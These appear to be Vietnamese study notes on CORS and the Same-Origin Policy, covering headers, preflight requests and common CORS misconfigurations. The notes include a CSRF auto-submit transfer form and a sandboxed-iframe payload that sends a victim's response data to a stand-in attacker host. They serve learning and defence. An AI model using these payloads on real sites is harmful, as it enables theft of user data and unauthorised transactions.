CORS (Cross-Origin Resource Sharing) là một **cơ chế của trình duyệt** cho phép một website yêu cầu tài nguyên từ một **domain khác** với domain mà trang đó đang chạy. Hiểu nôm na là một cánh cửa khác giúp tài nguyên được chia sẻ ( bù đắp cho SOP)
CORS mở rộng SOP bằng cách cho phép server **khai báo rõ** qua HTTP header rằng:
	- Những domain nào được phép truy cập tài nguyên của nó
	- Những method nào được chấp nhận (`GET`, `POST`, `PUT`...)
	- Có cho phép gửi cookie/credentials đi kèm hay không (`Access-Control-Allow-Credentials: true`)
Ví dụ:
``` text
Access-Control-Allow-Origin: https://example.com 
Access-Control-Allow-Methods: GET, POST
```
Khi đó, trình duyệt sẽ cho phép `https://example.com` thực hiện AJAX request tới server.

> COR không ngăn chặn được CSRF. Nó cũng không phải 1 cơ chế bảo mật

### Same-origin policy SOP
**Định nghĩa**
>**Same-Origin Policy** là quy tắc bảo mật của trình duyệt, quy định rằng **một trang web chỉ được phép truy cập dữ liệu (như DOM, cookie, localStorage, response API)** của chính nó (cùng origin: cùng protocol + domain + port).

>Nó có thể **gửi request** sang website khác, nhưng **không được phép đọc nội dung trả về**, trừ khi website kia cho phép rõ ràng bằng CORS.

### CORS and the Access-Control-Allow-Origin response header

#### 1. CORS và vai trò của Access-Control-Allow-Origin
- **CORS (Cross-Origin Resource Sharing)**: nới lỏng có kiểm soát của Same-Origin Policy thông qua các HTTP header.
- Trình duyệt quyết định cho phép hay chặn **đọc response cross-origin** dựa trên các header này.
- **Access-Control-Allow-Origin**: header trong response từ server → xác định origin nào được phép đọc dữ liệu.
- Trình duyệt so sánh giá trị này với origin của request:
    - Nếu trùng → cho phép đọc response.
    - Nếu không → block.
#### 2. Ví dụ CORS cơ bản
 **Request từ site A**
```
GET /data HTTP/1.1
Host: robust-website.com
Origin: https://normal-website.com
```
**Response từ server B**
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://normal-website.com
```
=> Vì origin trùng khớp → trình duyệt cho phép script tại `normal-website.com` đọc response.
#### 3. Các giá trị hợp lệ của Access-Control-Allow-Origin
- Một origin cụ thể: `Access-Control-Allow-Origin: https://normal-website.com`
- `null`
- Wildcard `*` (nhưng có giới hạn sử dụng)
**Lưu ý:**
- Không browser nào hỗ trợ nhiều origin trong một header.
- Wildcard không được phép viết như `https://*.example.com`.
#### 4. Cross-origin requests với **credentials**
- Mặc định request cross-origin **không gửi cookie/Authorization header**.
- Nếu server muốn cho phép **đọc response khi có credentials**:
    - Thêm header: `Access-Control-Allow-Credentials: true`
    - Và request phải có `credentials: include` trong JS.

 ##### Ví dụ
**Request:**
```
GET /data HTTP/1.1
Host: robust-website.com
Origin: https://normal-website.com
Cookie: JSESSIONID=<value>
```
**Response:**
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://normal-website.com
Access-Control-Allow-Credentials: true
```
- Khi có `Allow-Credentials: true` → browser cho phép đọc response.
- Nếu không có → browser block.
#### 5. Wildcard và vấn đề bảo mật
- `Access-Control-Allow-Origin: *` được phép.
- Nhưng không thể dùng kết hợp với credentials:
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true   ❌ KHÔNG HỢP LỆ
```
- Lý do: cực kỳ nguy hiểm, sẽ khiến mọi website có thể đọc dữ liệu nhạy cảm của người dùng.
- Một số server workaround: **reflect Origin header của client** → nguy hiểm nếu không validate.
#### 6. Pre-flight check (OPTIONS request)
- Khi request cross-origin dùng **method lạ** (PUT, DELETE, …) hoặc custom header → browser gửi trước một request `OPTIONS`.
- Đây là **pre-flight request** để hỏi server cho phép gì.
**Ví dụ pre-flight:**
``` Request
OPTIONS /data HTTP/1.1
Host: some-website
Origin: https://normal-website.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Special-Request-Header
```

``` Response
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://normal-website.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Special-Request-Header
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```
- Trình duyệt kiểm tra:
    - Method có được phép không? (PUT, POST, OPTIONS)
    - Header custom có được phép không? (Special-Request-Header)
- Nếu hợp lệ → gửi request thật.
- Nhược điểm: tốn thêm 1 round-trip HTTP → tăng overhead.
#### 7. CORS và CSRF
- **CORS không bảo vệ chống CSRF** → đây là hiểu nhầm phổ biến.
- CORS chỉ kiểm soát **đọc dữ liệu cross-origin**, không ngăn request được gửi đi.
- CSRF chỉ cần gửi request (không cần đọc response).
- Nếu CORS cấu hình sai (cho phép mọi origin + credentials) → còn làm **tăng rủi ro CSRF**.
**Ví dụ CSRF không cần CORS:**

```html
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>
```

### Vulnerabilities arising from CORS configuration issues
##### **1.Server-generated ACAO header from client-specified Origin header** 
Một số ứng dụng cần cho phép nhiều domain khác truy cập. Việc duy trì danh sách domain được phép khá tốn công, và dễ gây lỗi nếu sót. Vì vậy, một số ứng dụng chọn cách đơn giản: **cho phép mọi domain**.
Cách phổ biến: đọc giá trị từ header **Origin** của request, rồi trả về trong header **Access-Control-Allow-Origin** đúng origin đó, coi như “origin nào request tới cũng được phép”.
```
Request
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...

Response
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...
```

##### **2. Errors parsing Origin headers**
###### 1. Whitelist theo domain sai cách
Ứng dụng muốn chỉ cho phép một số domain (ví dụ: `innocent-website.com`) gọi API.  
Khi browser gửi request có header **Origin** là `https://innocent-website.com`, server check và phản hồi:
```Response
HTTP/1.1 200 OK  
Access-Control-Allow-Origin: https://innocent-website.com  
```
→ Browser cho phép đọc response.  
Sai lầm phổ biến:  
- Cho phép **tất cả subdomain** (`*.normal-website.com`) nhưng match regex sai.  
  - Nếu chỉ check "kết thúc bằng `normal-website.com`" → attacker đăng ký domain:  
    `hackersnormal-website.com` → vẫn pass filter.  
- Nếu chỉ check "bắt đầu bằng `normal-website.com`" → attacker dùng domain:  
  `normal-website.com.evil-user.net` → vẫn pass filter.  
###### 2. Whitelisted `null` origin value
Theo chuẩn, giá trị **Origin: null** hợp lệ và xảy ra trong một số tình huống:  
- Redirect cross-origin  
- Request từ `file://`  
- Request từ dữ liệu `data:` URL  
- `iframe` sandboxed

Nếu server **whitelist `null`** (thường để tiện dev local), attacker có thể lợi dụng.  
```Request
GET /sensitive-victim-data HTTP/1.1  
Host: vulnerable-website.com  
Origin: null  
```

```Response
HTTP/1.1 200 OK  
Access-Control-Allow-Origin: null  
Access-Control-Allow-Credentials: true
```  

Khi đó attacker có thể dùng một sandboxed iframe tạo request `Origin: null` để đọc dữ liệu:  
> Hiểu nôm na là để có Request gửi đi với `Origin: null` thì dùng iframe

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
  src="data:text/html,<script>
    var req = new XMLHttpRequest();
    req.onload = function(){
      location='https://malicious-website.com/log?key='+this.responseText;
    };
    req.open('GET','https://vulnerable-website.com/sensitive-victim-data',true);
    req.withCredentials = true;
    req.send();
  </script>">
</iframe>
```

##### **3.Exploiting XSS via CORS trust relationships**
##### Exploiting XSS via CORS trust relationships
Mặc dù việc cấu hình COR có chính xác tuy nhiên nếu Origin có lỗ hổng xss thì attacker có thể lợi dụng và trích xuất thông tin.

**Exploiting XSS via CORS trust relationships**
 1. CORS trust relationship
Website `vulnerable-website.com` có API: `/api/requestApiKey`.
Server cấu hình CORS cho phép `subdomain.vulnerable-website.com` gọi API, bằng cách trả header:
```
Access-Control-Allow-Origin: [https://subdomain.vulnerable-website.com](https://subdomain.vulnerable-website.com/)  
Access-Control-Allow-Credentials: true
```

→ Nghĩa là: chỉ khi JavaScript chạy trên `subdomain.vulnerable-website.com`, thì mới được phép đọc response từ `vulnerable-website.com/api/requestApiKey`.
 2. Nếu subdomain bị XSS
Giả sử `subdomain.vulnerable-website.com` có lỗ hổng **XSS**. Attacker chèn payload XSS vào subdomain. Vì script của attacker đang chạy từ **origin hợp lệ (subdomain)**, nên nó có thể gọi API chính (`vulnerable-website.com`) bằng AJAX/fetch kèm cookie của victim.
##### Breaking TLS with poorly configured CORS
**Vấn đề**
Website chính (`https://vulnerable-website.com`) chỉ dùng HTTPS, nhưng lại whitelist 1 subdomain chạy HTTP (`http://trusted-subdomain.vulnerable-website.com`).

**Điểm yếu**
- HTTP không có mã hóa → attacker có thể MITM (chặn và sửa nội dung).
- Khi CORS tin tưởng subdomain HTTP này → attacker có thể lợi dụng nó để đọc dữ liệu từ domain HTTPS chính.
 **Cách tấn công**
1. Nạn nhân bị ép truy cập `http://trusted-subdomain.vulnerable-website.com`.
2. Attacker MITM trả về một trang giả mạo có JavaScript.
3. JavaScript đó gửi CORS request tới `https://vulnerable-website.com/api/...` kèm cookie nạn nhân.
4. Server thấy origin hợp lệ (subdomain HTTP) → trả data nhạy cảm.
5. JavaScript đọc được data và gửi về cho attacker.
